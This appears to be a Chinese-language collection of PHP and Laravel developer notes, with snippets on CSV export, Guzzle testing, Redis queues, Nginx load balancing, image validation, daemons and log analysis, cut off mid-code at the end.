导出123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194class ExcelExport&#123; //字段对应的标题https://github.com/xcjiu/php-excel private $title = []; //文件名 private $filename = ''; //字段值过滤器 private $filter = []; //存储文件的临时目录 private $stodir = '../tmp/'; /** * 生成 excel 数据表文件 * @param array $data 要导出的数据 * @return bool */ public function excel($data=[], $i=1) &#123; set_time_limit(0); header("Content-type: text/html; charset=utf-8"); if($data &amp;&amp; is_array($data))&#123; $filename = $this-&gt;filename ? $this-&gt;filename : date('Y_m_d'); $filter = $this-&gt;filter; $current = current($data); if(is_array($current))&#123; $filePath = $this-&gt;stodir . $filename . "($i)" . '.csv'; $fp = fopen($filePath, 'a'); fputcsv($fp, $this-&gt;titleColumn(array_keys($current))); foreach ($data as &amp;$row) &#123; foreach ($row as $k =&gt; &amp;$v) &#123; if(isset($filter[$k]))&#123; if($filter[$k]=='datetime')&#123; $v = date("Y-m-d H:i:s",$v); &#125; if($filter[$k]=='date')&#123; $v = date("Y-m-d",$v); &#125; if(is_array($filter[$k]))&#123; $v = isset($filter[$k][$v]) ? $filter[$k][$v] : $v; &#125; &#125; &#125; fputcsv($fp, $row); &#125; fclose($fp); unset($data); return true; &#125; &#125; return false; &#125; /** * 打包好zip文件并导出 * @param [type] $filename [description] * @return [type] [description] */ public function fileload() &#123; $zipname = "../" . $this-&gt;filename. '.zip'; $zipObj = new ZipArchive(); if($zipObj-&gt;open($zipname, ZipArchive::CREATE) === true)&#123; $res = false; foreach(glob($this-&gt;stodir . "*") as $file)&#123; $res = $zipObj-&gt;addFile($file); &#125; $zipObj-&gt;close(); if($res)&#123; header ("Cache-Control: max-age=0"); header("Content-Description: File Transfer"); header("Content-Disposition: attachment;filename =" . $zipname); header('Content-Type: application/zip'); header('Content-Transfer-Encoding: binary'); header ('Content-Length: ' . filesize($zipname)); @readfile($zipname);//输出文件; //清理临时目录和文件 $this-&gt;deldir($this-&gt;stodir); @unlink($zipname); ob_flush(); flush(); &#125;else&#123; $this-&gt;deldir($this-&gt;stodir); ob_flush(); flush(); die('暂无文件可下载！'); &#125; &#125;else&#123; $this-&gt;deldir($this-&gt;stodir); ob_flush(); flush(); die('文件压缩失败！'); &#125; &#125; /** * 清理目录，删除指定目录下所有内容及自身文件夹 * @param [type] $dir [description] * @return [type] [description] */ private function deldir($dir) &#123; if(is_dir($dir))&#123; foreach(glob($dir . '*') as $file)&#123; if(is_dir($file)) &#123; deldir($file); @rmdir($file); &#125; else &#123; @unlink($file); &#125; &#125; @rmdir($dir); &#125; &#125; /** * 设置标题 * @param array $title 标题参数为字段名对应标题名称的键值对数组 * @return obj this */ public function title($title) &#123; if($title &amp;&amp; is_array($title))&#123; $this-&gt;title = $title; &#125; return $this; &#125; /** * 设置导出的文件名 * @param string $filename 文件名 * @return obj this */ public function filename($filename) &#123; $this-&gt;filename = date('Y_m_d') . (string)$filename; if(!is_dir("../" . $this-&gt;filename))&#123; mkdir("../" . $this-&gt;filename); &#125; $this-&gt;stodir = "../" . $this-&gt;filename . "/"; return $this; &#125; /** * 设置字段过滤器 * @param array $filter 文件名 * @return obj this */ public function filter($filter) &#123; $this-&gt;filter = (array)$filter; return $this; &#125; /** * 确保标题字段名和数据字段名一致,并且排序也一致 * @param array $keys 要显示的字段名数组 * @return array 包含所有要显示的字段名的标题数组 */ protected function titleColumn($keys) &#123; $title = $this-&gt;title; if($title &amp;&amp; is_array($title))&#123; $titleData = []; foreach ($keys as $v) &#123; $titleData[$v] = isset($title[$v]) ? $title[$v] : $v; &#125; return $titleData; &#125; return $keys; &#125;&#125;$limit = 10000; //一次查询一万条记录$filename = 'login_log';$title = ['id'=&gt;'ID','user_id'=&gt;'用户id','plat'=&gt;'渠道','username'=&gt;'用户名','sex'=&gt;'性别','ip'=&gt;'用户ip','register_time'=&gt;'注册时间'];$filter = ['register_time'=&gt;'datetime'];$con = mysqli_connect('127.0.0.1','root','pass','dbname') or die('数据库连接不上');$countSql = "select count(*) from user";$count = mysqli_fetch_assoc(mysqli_query($con,$countSql));$total = $count['count(*)'];$excelObj = (new ExcelExport())-&gt;filename($filename)-&gt;title($title)-&gt;filter($filter);for ($i=0; $i &lt; ceil($total/$limit); $i++) &#123; //分段查询, 一次$limit=10000条 $offset = $i * $limit; $dataSql = "select * from user limit $limit offset $offset"; $result = mysqli_query($con, $dataSql); $data = []; while ($row = mysqli_fetch_assoc($result)) &#123; $data[] = $row; &#125; $res = $excelObj-&gt;excel($data, $i+1); //生成多个文件时的文件名后面会标注'（$i+1）'&#125;mysqli_close($con);$excelObj-&gt;fileload(); 使用Guzzle进行API测试1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192//https://www.jianshu.com/p/3de203392ec4php composer.phar require guzzlehttp/guzzle:~6.0composer global require "phpunit/phpunit=5.5.*"新建一个单元测试php artisan make:test ReplyTest --unit单独执行某个测试 phpunit tests/Unit/ReplyTest.php #cat tests/TestCase.php &lt;?php namespace Tests; use Illuminate\Foundation\Testing\TestCase as BaseTestCase; abstract class TestCase extends BaseTestCase &#123; use CreatesApplication; &#125;cat tests/Unit/ReplyTest.php&lt;?phpnamespace Tests\Unit;use Tests\TestCase;use Illuminate\Foundation\Testing\RefreshDatabase;class ReplyTest extends TestCase&#123; //https://www.jianshu.com/p/3de203392ec4 protected $client; public function setUp() &#123; $this-&gt;client = new \GuzzleHttp\Client( [ 'base_uri' =&gt; 'http://httpbin.org', 'http_errors' =&gt; false, #设置成 false 来禁用HTTP协议抛出的异常(如 4xx 和 5xx 响应)，默认情况下HTPP协议出错时会抛出异常。 ]); &#125; public function testAction1() &#123; $response = $this-&gt;client-&gt;get('/ip'); $body = $response-&gt;getBody(); //添加测试 $this-&gt;assertEquals(200, $response-&gt;getStatusCode()); $data = json_decode($body, true);dump($data); $this-&gt;assertArrayHasKey('origin', $data); //$this-&gt;assertArrayHasKey('errormsg', $data); //$this-&gt;assertArrayHasKey('data', $data); //$this-&gt;assertEquals(0, $data['origin']); $this-&gt;assertInternalType('string', $data['origin']); &#125; public function testAction2() &#123; $response = $this-&gt;client-&gt;post('/post', [ 'form_params' =&gt; [ 'name' =&gt; 'myname', 'age' =&gt; 20, ], ]); $body = $response-&gt;getBody(); //添加测试 $this-&gt;assertEquals(200, $response-&gt;getStatusCode()); $data = json_decode($body, true); $this-&gt;assertArrayHasKey('errorno', $data); $this-&gt;assertArrayHasKey('errormsg', $data); $this-&gt;assertArrayHasKey('data', $data); $this-&gt;assertEquals(0, $data['errorno']); $this-&gt;assertInternalType('array', $data['data']); &#125; &#125;$ phpunit tests/unit/MyApiTest.phpPHPUnit 6.5.3 by Sebastian Bergmann and contributors.array:1 [ "origin" =&gt; "61.135.152.130"].F 2 / 2 (100%)Time: 1.54 seconds, Memory: 12.00MBThere was 1 failure:1) Tests\Unit\MyApiTest::testAction2Failed asserting that an array has the key 'errorno'.D:\php_study\PHPTutorial\WWW\laravel\tests\Unit\MyApiTest.php:46FAILURES!Tests: 2, Assertions: 5, Failures: 1. guzzle并发12345678910111213141516171819202122232425262728293031323334353637use GuzzleHttp\Client;use Illuminate\Console\Command;use Psr\Http\Message\ResponseInterface;use GuzzleHttp\Exception\RequestException;use GuzzleHttp\Promise;$client = new Client([ // 基URI https://www.goozp.com/article/56.html 'base_uri' =&gt; 'http://httpbin.org', // 设置默认请求参数 'timeout' =&gt; 2.0, ]); $promise = $client-&gt;requestAsync('GET', 'http://httpbin.org/get'); $promise-&gt;then( function (ResponseInterface $res) &#123; echo $res-&gt;getStatusCode() . "\n"; &#125;, function (RequestException $e) &#123; echo $e-&gt;getMessage() . "\n"; echo $e-&gt;getRequest()-&gt;getMethod(); &#125; ); // 初始化每一个非阻塞请求 $promises = [ 'image' =&gt; $client-&gt;getAsync('/image'), 'ip' =&gt; $client-&gt;getAsync('/ip'), 'png' =&gt; $client-&gt;getAsync('/image/png'), 'jpeg' =&gt; $client-&gt;getAsync('/image/jpeg'), 'webp' =&gt; $client-&gt;getAsync('/image/webp') ]; // 等待请求完成 $results = Promise\unwrap($promises);dump($results['ip']-&gt;getBody()-&gt;getContents()); // 通过键名接收每一个结果 // function. dump($results['image']-&gt;getHeader('Content-Length')) ; dump($results['png']-&gt;getHeader('Content-Length')) ; Guzzle：PHP的HTTP客户端 ab 登录12345先用账户和密码登录用开发者工具找到标识这个会话的Cookie值（Session ID）记下来执行命令：一个Cookie情况时：ab －n 100 －C key＝value http://test.com/多个Cookie情况时，设置Header：ab -n 100 -H “Cookie: Key1=Value1; Key2=Value2” http://test.com/ 查看16进制123456789101112131415161718192021echo 'welcome' &gt; file1$ hexdump file10000000 6577 636c 6d6f 0a650000008$ hexdump -C file100000000 77 65 6c 63 6f 6d 65 0a |welcome.|00000008$ od -x file10000000 6577 636c 6d6f 0a650000010$ od -xc file10000000 6577 636c 6d6f 0a65 w e l c o m e \n0000010$ xxd file10000000: 7765 6c63 6f6d 650a welcome.$ cat file2000000: 7765 6c63 6f6d 650a$ xxd -r file2welcome 消息队列123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566CREATE TABLE `redis_queue`( `id` int(10) unsigned NOT NULL AUTO_INCREMENT, `uid` int(11) NOT NULL DEFAULT `0`, `time_stamp` varchar(24) NOT NULL, PRIMARY KEY(`id`))ENGINE=InnoDB DEFAULT CHARSET=utf8;接收用户请求的user.php&lt;?php// 加载redis组件$redis = new Redis();$redis -&gt; connect('127.0.0.1', 6379);$redis_name = 'miaosha';// 接收用户的id$uid = $_GET['uid'];// 获取一下redis里面已有的数量$num = $redis-&gt;lLen($redis_name);// 如果当天人数少于10的时候,则加入这个队列if ($num &lt; 10) &#123; $redis-&gt;rPush($redis_name, $uid.'%'.microtime()); echo $uid.'秒杀成功';&#125; else&#123; // 如果当天人数已经达到了10个人,则返回秒杀已完成 echo '秒杀已结束';&#125;$redis-&gt;close(); 处理队列的入库程序&lt;?phpinclude '../include/db.php';// 加载redis组件$redis = new Redis();$redis -&gt; connect('127.0.0.1', 6379);$redis_name = 'miaosha';$db= DB::getIntance();// 死循环while (1) &#123; // 从队列最左取出一个值来 $user = $redis-&gt;lPop($redis_name); // 然后判断这个值是否存在 if (!$user || $user=='nil') &#123; sleep(2); continue; &#125; // 切割出时间 $user_arr = explode('%', $user); $insert_data = array( 'uid' =&gt; $user_arr[0], 'time_stamp' =&gt; $user_arr[1], ); // 保存到数据库中 $res = $db-&gt;insert('redis_queue', $insert_data); // 数据库插入失败的时候的回滚机制 if (!$res) &#123; $redis-&gt;rPush($redis_name, $user); &#125; sleep(2);&#125;//释放redis$redis -&gt; close(); 将一组数字组合出一个最大值12345678910111213//https://www.raymondwu.net/2018/08/24/%E5%B0%86%E4%B8%80%E7%BB%84%E6%95%B0%E5%AD%97%E7%BB%84%E5%90%88%E5%87%BA%E4%B8%80%E4%B8%AA%E6%9C%80%E5%A4%A7%E5%80%BC/$items = [50, 1, 2, 9];//若有一个数组的值为 [50, 1, 2, 9]，那么它的最大组合值就是95021for ($i = 0; $i &lt; count($items); $i++) &#123; for ($j = $i + 1; $j &lt; count($items); $j++) &#123; $a = (string)$items[$i]; $b = (string)$items[$j]; if ($a . $b &lt; $b . $a) &#123; $items[$i] = $b; $items[$j] = $a; &#125; &#125;&#125;echo implode('', $items); Nginx 部署 MySQL 负载均衡123456789101112stream &#123; upstream dbserver &#123; server 172.16.121.131:3306; server 172.16.121.132:3306; server 172.16.121.133:3306; &#125; server &#123; listen 3307; proxy_pass dbserver; &#125;&#125;定义了三台从数据库服务器，分别是 172.16.121.131 ~ 133。当我以 3307 端口请求服务器时，服务器就会将我的请求代理到服务器组里，并按照顺序请求。 php artisan1234567891011121314151617php artisan listphp artisan list makeAvailable commands for the "make" namespace: make:command Create a new command class make:console Create a new Artisan command make:controller Create a new resource controller class make:event Create a new event class make:middleware Create a new middleware class make:migration Create a new migration file make:model Create a new Eloquent model class make:provider Create a new service provider class make:request Create a new form request classphp artisan migrate:refresh -hphp artisan make:controller -hphp artisan list app Laravel Eloquent 提示和技巧1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556$article = Article::find($article_id);$article-&gt;increment('read_count');Article::find($article_id)-&gt;increment('read_count');Article::find($article_id)-&gt;increment('read_count', 10); // +10Product::find($produce_id)-&gt;decrement('stock'); // -1$user = User::findOrFail($id);$user = User::firstOrCreate(['email' =&gt; $email]); public function approvedUsers() &#123; retrun $this-&gt;hasMany('App\User')-&gt;where('approved', 1)-&gt;orderBy('email'); &#125;$users = User::find([1,2,3]);$users = User::where('approved', 1)-&gt;get();$query = Author::query();$query-&gt;when(request('filter_by') == 'likes', function ($q) &#123; return $q-&gt;where('likes', '&gt;', request('likes_amount', 0));&#125;);$query-&gt;when(request('filter_by') == 'date', function ($q) &#123; return $q-&gt;orderBy('created_at', request('ordering_rule', 'desc'));&#125;);$query = User::query();$query-&gt;when(request('role', false), function ($q) use ($role) &#123; return $q-&gt;where('role_id', $role);&#125;);$authors = $query-&gt;get();public function author()&#123; return $this-&gt;belongsTo('App\Author')-&gt;withDefault();&#125;// whereRaw $orders = DB::table('orders') -&gt;whereRaw('price &gt; IF(state = "TX", ?, 100)', [200]) -&gt;get(); // havingRaw Product::groupBy('category_id')-&gt;havingRaw('COUNT(*) &gt; 1')-&gt;get(); // orderByRaw User::where('created_at', '&gt;', '2018-11-11') -&gt;orderByRaw('(updated_at - created_at) desc') -&gt;get(); $task = Task::find(1); $newTask = $task-&gt;replicate(); $newTask-&gt;save();$product = Product::find(1);$product-&gt;updated_at = '2018-11-11 11:11:11';$product-&gt;save(['timestamps' =&gt; false]); $q-&gt;where(function ($query) &#123; $query-&gt;where('gender', 'Male')-&gt;where('age', '&gt;', 18);&#125;)-&gt;orWhere(function ($query) &#123; $query-&gt;where('gender', 'Female')-&gt;orWhere('age', '&gt;=', 65);&#125;) 判断图片123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263使用getimagesize()函数,如果不能访问 filename 指定的图像或者其不是有效的图像，getimagesize() 将返回 FALSE 并产生一条 E_WARNING 级的错误。$file = $req-&gt;file("imgfile");dump(getimagesize ($file-&gt;getRealPath()));array:7 [ 0 =&gt; 3024 1 =&gt; 4032 2 =&gt; 2 3 =&gt; "width="3024" height="4032"" "bits" =&gt; 8 "channels" =&gt; 3 "mime" =&gt; "image/jpeg"]$imgUrl = "http://www.baidu.com/img/shouye_b5486898c692066bd2cbaeda86d74448.gif";$data = file_get_contents($imgUrl);//echo ($data);$im = imagecreatefromstring($data);if($im != false)&#123; echo '&lt;p&gt;图片正常...&lt;/p&gt;';&#125;else&#123; echo '&lt;p&gt;图片已损坏...&lt;/p&gt;';&#125;function check_img_by_source($source) &#123; switch(bin2hex(substr($source,0,2)))&#123; case 'ffd8' : return 'ffd9' === bin2hex(substr($source,-2)); case '8950' : return '6082' === bin2hex(substr($source,-2)); case '4749' : return '003b' === bin2hex(substr($source,-2)); default : return false; &#125; &#125;var_dump(check_img_by_source(file_get_contents('11.gif'));function isImage($filename)&#123; $types = '.gif|.jpeg|.png|.bmp'; //定义检查的图片类型 if(file_exists($filename)) &#123; if (($info = @getimagesize($filename)) return 0; $ext = image_type_to_extension($info['2']); return stripos($types,$ext); &#125; else &#123; return false; &#125;&#125;if(isImage('isimg.txt')!==false)&#123; echo isImage('1.jpg'); echo '是图片';&#125;else&#123; echo '不是图片';&#125;$mimetype = exif_imagetype("1.jpg");if ($mimetype == IMAGETYPE_GIF || $mimetype == IMAGETYPE_JPEG || $mimetype == IMAGETYPE_PNG || $mimetype == IMAGETYPE_BMP)&#123; echo "是图片";&#125; 位运算123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354class LightControl&#123; const TURN_ON_ALL = 0b11111; const KITCHEN = 0b10000; const SECOND_LIE = 0b01000; const DINING_ROOM = 0b00100; const LIVING_ROOM = 0b00010; const MASTER_ROOM = 0b00001; private $options; public function __construct($options = 0) &#123; $this-&gt;options = $options; echo '主卧', "\t"; echo '客厅', "\t"; echo '餐厅', "\t"; echo '次卧', "\t"; echo '厨房', "\t", PHP_EOL; &#125; public function getOptions() &#123; return $this-&gt;options; &#125; public function setOptions($options) &#123; $this-&gt;options = $options; &#125; public function showOptions() &#123; echo self::getOption($this-&gt;options, self::MASTER_ROOM), "\t"; echo self::getOption($this-&gt;options, self::LIVING_ROOM), "\t"; echo self::getOption($this-&gt;options, self::DINING_ROOM), "\t"; echo self::getOption($this-&gt;options, self::SECOND_LIE), "\t"; echo self::getOption($this-&gt;options, self::KITCHEN); &#125; //获取指定灯的开关状态https://laravel-china.org/articles/22312 private static function getOption($options, $option) &#123; return intval(($options &amp; $option) &gt; 0); &#125;&#125;$lightControl = new LightControl();$lightControl-&gt;showOptions();主卧 客厅 餐厅 次卧 厨房 0 0 0 0 0$lightControl = new LightControl(LightControl::TURN_ON_ALL ^ LightControl::KITCHEN);$lightControl-&gt;showOptions();主卧 客厅 餐厅 次卧 厨房 1 1 1 1 0 CURL 发送文件12345678910111213141516171819202122232425262728293031323334353637383940&lt;form action="/testFile" method="post" enctype="multipart/form-data"&gt; &lt;input type="file" name="file" /&gt; &lt;input type="submit" /&gt;&lt;/form&gt;public function testFile(Request $request)&#123; $data = array( 'file'=&gt; new \CURLFile(realpath($request-&gt;file('file')-&gt;path())), ); $ch = curl_init(); curl_setopt($ch, CURLOPT_URL,"/testLoadFile");//此处以当前服务器为接收地址 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_TIMEOUT,10);//设置最长等待时间 curl_setopt($ch, CURLOPT_POST, 1);//post提交 curl_setopt($ch, CURLOPT_POSTFIELDS, $data); $data = curl_exec($ch);//执行 if(curl_errno($ch))&#123; return curl_error($ch); &#125; curl_close($ch);//释放 return json_encode($data); &#125; public function testLoadFile(Request $request)&#123; if ($request-&gt;hasFile('file')) &#123; if ($request-&gt;file('file')-&gt;isValid())&#123; // 上传成功 // 随机名字 . 后缀 $fileName = "other/".Date("YmdHis").substr(md5(time()),5,15).".".$request-&gt;file("file")-&gt;extension();// 需要 开启php_fileinfo 扩展 否则会报错 // 获取临时上传的路径（如果不存在本地，则方法调用完之后，会被删除） //$fileUrl = $request-&gt;file('file')-&gt;path(); // 可选存储在本地 $fileUrl = $request-&gt;file("file")-&gt;move(__DIR__."/",$fileName); return ($fileUrl); &#125; &#125; return json_encode([]); &#125; 验证图片安全12345678910111213141516171819202122232425262728293031/** * 检查某个路径是否在指定文件夹内。若为真，返回此路径，否则返回 false。 * @param String $path 被检查的路径https://laravel-china.org/topics/19624 * @param String $folder 文件夹的路径，$path 必须在此文件夹内 * @return bool|string 失败返回 false，成功返回 $path * */function checkPathIsInFolder($path, $folder) &#123; if ($path === '' OR $path === null OR $path === false OR $folder === '' OR $folder === null OR $folder === false) &#123; /* 不能使用 empty() 因为有可能像 "0" 这样的字符串也是有效的路径 */ return false; &#125; $folderRealpath = realpath($folder); $pathRealpath = realpath($path); if ($pathRealpath === false OR $folderRealpath === false) &#123; // Some of paths is empty return false; &#125; $folderRealpath = rtrim($folderRealpath, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR; $pathRealpath = rtrim($pathRealpath, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR; if (strlen($pathRealpath) &lt; strlen($folderRealpath)) &#123; // 文件路径比文件夹路径短，那么这个文件不可能在此文件夹内。 return false; &#125; if (substr($pathRealpath, 0, strlen($folderRealpath)) !== $folderRealpath) &#123; // 文件夹的路径不等于它必须位于的文件夹的路径。 return false; &#125; // OK return $path;&#125; shell1234567891011121314151617181920212223241、查看当天有多少个IP访问：awk '&#123;print $1&#125;' log_file|sort|uniq|wc -l 2、查看某一个页面被访问的次数：grep "/index.php" log_file | wc -l 3、查看每一个IP访问了多少个页面：awk '&#123;++S[$1]&#125; END &#123;for (a in S) print a,S[a]&#125;' log_file 4、将每个IP访问的页面数进行从小到大排序：awk '&#123;++S[$1]&#125; END &#123;for (a in S) print S[a],a&#125;' log_file | sort -n 5、查看某一个IP访问了哪些页面：grep ^111.111.111.111 log_file| awk '&#123;print $1,$7&#125;' 6、去掉搜索引擎统计当天的页面：awk '&#123;print $12,$1&#125;' log_file | grep ^\"Mozilla | awk '&#123;print $2&#125;' |sort | uniq | wc -l 7、查看2018年11月21日14时这一个小时内有多少IP访问：awk '&#123;print $4,$1&#125;' log_file | grep 21/Nov/2018:14 | awk '&#123;print $2&#125;'| sort | uniq | wc -l 8、列出当天访问次数最多的IP表示用-分割 表示打印第一部分 将重复行去掉， -c表示前面前面加上数目 按照数字从大到小排序cut -d- -f 1 log_file |uniq -c | sort -rn | head -20 守护进程123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156class Deamon&#123; protected $_pidFile; public function __construct() &#123; $this-&gt;_pidFile = '/var/www/html/queue/public/pid.log'; $this-&gt;_checkPcntl(); &#125; /** * 创建守护进程核心函数 * @return string|void */ private function _demonize() &#123; if (php_sapi_name() != 'cli') &#123; die('Should run in CLI'); &#125; //创建子进程 $pid = pcntl_fork(); if ($pid == -1) &#123; return 'fork faile'; &#125; elseif ($pid) &#123; //终止父进程 exit('parent process'); &#125; //在子进程中创建新的会话 if (posix_setsid() === -1) &#123; die('Could not detach'); &#125; //改变工作目录 chdir('/'); //重设文件创建的掩码 umask(0); $fp = fopen($this-&gt;_pidFile, 'w') or die("Can't create pid file"); //把当前进程的id写入到文件中 fwrite($fp, posix_getpid()); fclose($fp); //关闭文件描述符 fclose(STDIN); fclose(STDOUT); fclose(STDERR); //运行守护进程的逻辑 $this-&gt;job(); return; &#125; /** * 守护进程的任务 */ private function job() &#123; //TODO 你的守护经常需要执行的任务 while (true) &#123; file_put_contents('/var/www/html/queue/public/job.log', 'job' . PHP_EOL, FILE_APPEND); sleep(5); &#125; &#125; /** * 获取守护进程的id * @return int */ private function _getPid() &#123; //判断存放守护进程id的文件是否存在 if (!file_exists($this-&gt;_pidFile)) &#123; return 0; &#125; $pid = intval(file_get_contents($this-&gt;_pidFile)); if (posix_kill($pid, SIG_DFL)) &#123;//判断该进程是否正常运行中 return $pid; &#125; else &#123; unlink($this-&gt;_pidFile); return 0; &#125; &#125; /** * 判断pcntl拓展 */ private function _checkPcntl() &#123; !function_exists('pcntl_signal') &amp;&amp; die('Error:Need PHP Pcntl extension!'); &#125; private function _message($message) &#123; printf("%s %d %d %s" . PHP_EOL, date("Y-m-d H:i:s"), posix_getpid(), posix_getppid(), $message); &#125; /** * 开启守护进程 */ private function start() &#123; if ($this-&gt;_getPid() &gt; 0) &#123; $this-&gt;_message('Running'); &#125; else &#123; $this-&gt;_demonize(); $this-&gt;_message('Start'); &#125; &#125; /** * 停止守护进程 */ private function stop() &#123; $pid = $this-&gt;_getPid(); if ($pid &gt; 0) &#123; //通过向进程id发送终止信号来停止进程 posix_kill($pid, SIGTERM); unlink($this-&gt;_pidFile); echo 'Stoped' . PHP_EOL; &#125; else &#123; echo "Not Running" . PHP_EOL; &#125; &#125; private function status() &#123; if ($this-&gt;_getPid() &gt; 0) &#123; $this-&gt;_message('Is Running'); &#125; else &#123; echo 'Not Running' . PHP_EOL; &#125; &#125; public function run($argv) &#123; $param = is_array($argv) &amp;&amp; count($argv) == 2 ? $argv[1] : null; switch ($param) &#123; case 'start': $this-&gt;start(); break; case 'stop': $this-&gt;stop(); break; case 'status': $this-&gt;status(); break; default: echo "Argv start|stop|status " . PHP_EOL; break; &#125; &#125;&#125;$deamon = new \Deamon();$deamon-&gt;run($argv);开启守护进程：php demon.php start停止守护进程：php demon.php stop查看守护进程的状态：php demon.php status laravel获取记录的原始属性1234567$user = App\User::first();$user-&gt;name; //John$user-&gt;name = "Peter"; //Peter$user-&gt;getOriginal('name'); //John$user-&gt;getOriginal(); //原始 $user 记录 获取重复值12345678910111213// 获取去掉重复数据的数组$a = [1,2,3,4,5,6,3,6];$uniqueArr = array_unique ($a);// 获取重复数据的数组 array_diff_assoc() 返回一个数组，该数组包括了所有在 array1 中但是不在任何其它参数数组中的值。注意和 array_diff() 不同的是键名也用于比较。$repeatArr = array_diff_assoc ($a,$uniqueArr);var_dump($repeatArr);结果：array(2) &#123; [6]=&gt; int(3) [7]=&gt; int(6)&#125; 表限制12345678表数据限制：1、Excel 2003及以下的版本。一张表最大支持65536行数据，256列。2、Excel 2007-2010版本。一张表最大支持1048576行，16384列。https://laravel-china.org/articles/22724 也就是说你想几百万条轻轻松松一次性导入一张EXCEL表是不行的，你起码需要进行数据分割，保证数据不能超过104W一张表。PHPexcel内存溢出：既然数据限制在104W，那么数据分割就数据分割呗，于是你尝试50W一次导入表，然而PHPexcel内部有函数报内存溢出错误，然后你就不断的调小数据量，直到5W一次导入你都会发现有内存溢出错误。 带索引检查计算数组的差集12345678910111213141516171819202122232425262728$array1 = array("a" =&gt; "green", "b" =&gt; "brown", "c" =&gt; "blue", "red");$array2 = array("a" =&gt; "green", "yellow", "red");$result = array_diff_assoc($array1, $array2);print_r($result); // 输出：["b" =&gt; "brown", "c" =&gt; "blue", 0 =&gt; "red"]// 大家可以发现这里 red 有输出，为啥呢，因为第二个数组中 red 的 key 为 1。与数组一中的 key 为 0，不一致，所以有输出。https://laravel-china.org/articles/22678// Laravel $array1 = collect([ "a" =&gt; "green", "b" =&gt; "brown", "c" =&gt; "blue", "red" ]); $array2 = [ "a" =&gt; "green", "yellow", "red" ]; return $array1-&gt;diffAssoc($array2);// Result &#123;"0": "red","b": "brown","c": "blue"&#125; 过滤xss123$ composer require "mews/purifier:~2.0"$ php artisan vendor:publish --provider="Mews\Purifier\PurifierServiceProvider"$topic-&gt;body = clean($topic-&gt;body, 'default'); laravel事件队列123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384&lt;?php namespace App\Htt\Controllers; use Illuminate\Http\Request; //我们先引入一个事件类，名字自定义的，之后再一步一步创建 use App\Events\Register; class UserController extends Controller &#123; public function register(Request $request) &#123; //获取参数 //验证参数 //写入数据库 //触发事件，以后所有需要注册后要做的事情，都不需要再这里加代码了，我们只需要管理事件就好了 //event方法是laravel自带方法, $uid是外部参数，看你需要做什么，传什么参数了。注册之后肯定有$uid的嘛 event(new Register($uid)); //return 注册信息 &#125; &#125; &lt;?php namespace App\Providers; use Laravel\Lumen\Providers\EventServiceProvider as ServiceProvider class EventServiceProvider extends ServiceProvider &#123; protected $listen = [ // 用户注册后的事件 'App\Events\Register' =&gt; [ // 发送广告邮件 'App\Listeners\SendAdMail', // 发送短信 'App\Listeners\SendSms', // 发送帮助信息 'App\Listeners\SendHelpInformation', ], ]; &#125; &lt;?php namespace App\Events; class Register &#123; public $uid; /** * 创建一个新的事件实例. * * @param Order $order * @return void */ public function __construct($uid) &#123; $this-&gt;uid = $uid; &#125; &#125; &lt;?php namespace App\Listeners; use App\Events\Register; use App\Models\User; use Illuminate\Contracts\Queue\ShouldQueue; class SendHelpInformation implements ShouldQueue &#123; public function __construct() &#123; // &#125; public function handle(Register $event) &#123; $uid = $event-&gt;uid; $user = User::find($uid); //......各种实现 &#125; &#125; guzzle上传图片123456789101112131415$client = new \GuzzleHttp\Client(); $body = fopen('/home/summer/图片/dog1.jpg', 'r');//https://laravel-china.org/articles/22813?#reply79441 $response = $client-&gt;request('POST', 'http://account.chr.test/upload', [ 'multipart' =&gt; [ [ 'name' =&gt; 'body', 'contents' =&gt; fopen('/home/summer/图片/dog1.jpg', 'r') ], ] ] ); dump($response-&gt;getStatusCode()); #打印响应信息 dump($response-&gt;getBody()); dump(json_decode($response-&gt;getBody()-&gt;getContents())); #输出结果 guzzle123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293//https://media.readthedocs.org/pdf/guzzle/5.3/guzzle.pdfuse GuzzleHttp\Event\EmitterInterface;use GuzzleHttp\Event\SubscriberInterface;use GuzzleHttp\Event\BeforeEvent;use GuzzleHttp\Event\CompleteEvent;class SimpleSubscriber implements SubscriberInterface&#123;public function getEvents()&#123;return [// Provide name and optional priority'before' =&gt; ['onBefore', 100],'complete' =&gt; ['onComplete'],// You can pass a list of listeners with different priorities'error' =&gt; [['beforeError', 'first'], ['afterError', 'last']]];&#125;public function onBefore(BeforeEvent $event, $name)&#123;echo 'Before!';&#125;public function onComplete(CompleteEvent $event, $name)&#123;echo 'Complete!';&#125;&#125;$client = new GuzzleHttp\Client();$emitter = $client-&gt;getEmitter();$subscriber = new SimpleSubscriber();$emitter-&gt;attach($subscriber);//to remove the listeners$emitter-&gt;detach($subscriber);use GuzzleHttp\Client;use GuzzleHttp\Event\EmitterInterface;use GuzzleHttp\Event\BeforeEvent;$client = new Client(['base_url' =&gt; 'http://httpbin.org']);$request = $client-&gt;createRequest('GET', '/');$request-&gt;getEmitter()-&gt;on('before',function (BeforeEvent $e, $name) &#123;echo $name . "\n";// "before"echo $e-&gt;getRequest()-&gt;getMethod() . "\n";// "GET" / "POST" / "PUT" / etc.echo get_class($e-&gt;getClient());// "GuzzleHttp\Client"&#125;);function json_decode($json, $assoc = false, $depth = 512, $options = 0)&#123; $data = \json_decode($json, $assoc, $depth, $options); if (JSON_ERROR_NONE !== json_last_error()) &#123; throw new \InvalidArgumentException( 'json_decode 